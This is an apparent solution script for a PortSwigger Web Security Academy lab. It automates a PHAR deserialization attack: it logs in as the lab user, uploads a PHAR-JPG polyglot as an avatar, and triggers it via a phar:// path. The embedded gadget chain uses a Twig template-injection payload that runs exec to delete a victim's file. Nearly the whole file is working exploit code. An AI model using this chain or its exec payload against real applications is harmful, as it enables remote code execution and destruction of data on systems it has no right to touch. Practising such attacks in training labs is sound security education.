# Using PHAR deserialization to deploy a custom gadget chain

# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#		JPG FILE GENERATED WITH PHAR-JPG-POLYGLOT
#		https://github.com/kunte0/phar-jpg-polyglot


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_infos(s, url):
	print('\n[+] Trying to retrieve source code...')
	template_path = '/cgi-bin/CustomTemplate.php~'
	r = s.get(url + template_path)
	time.sleep(1)
	print('[+] Following the template file link: \t\t%s\n' % template_path)
	print(r.text)

def get_cookies(s):
	print('\n[+] Trying to retrieve session cookies...')
	session = s.cookies['session']
	parsed_session = urllib.parse.unquote(session)
	print('\n[+] Found Session Cookie:\t\t%s' % parsed_session)

def send_avatar(s, url):
	print('\n[+] Trying to send pre-generated SSTI payload as avatar (out.jpg):')
	print("""class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;""")
	account_path = url + '/my-account'
	post_avatar_path = url + '/my-account/avatar'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	exploit_files = {'avatar': open('out.jpg', 'rb')}
	data = {'csrf': csrf_token}
	r = s.post(post_avatar_path, files=exploit_files, data=data, allow_redirects=False)
	if r.status_code != 302:
		print('[-] Failed to Upload the file <!>')
	time.sleep(1)

def trigger_payload(s, url):
	payload_path = url + '/cgi-bin/avatar.php?avatar=phar://wiener'
	print('\n[+] Trying to deserialize the phar payload:\t%s' % payload_path)
	r = s.get(payload_path)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Using PHAR deserialization to deploy a custom gadget chain')
	parser = argparse.ArgumentParser(description="[+] Lab: Using PHAR deserialization to deploy a custom gadget chain")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos morale.txt file...\n')
			time.sleep(1)
			print('\n[+] Trying to send a crafted phar payload in a JPG file as avatar...')
			r = connect_as_wiener(s, url)
			get_cookies(s)
			get_infos(s, url)
			send_avatar(s, url)
			trigger_payload(s, url)
			time.sleep(2)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
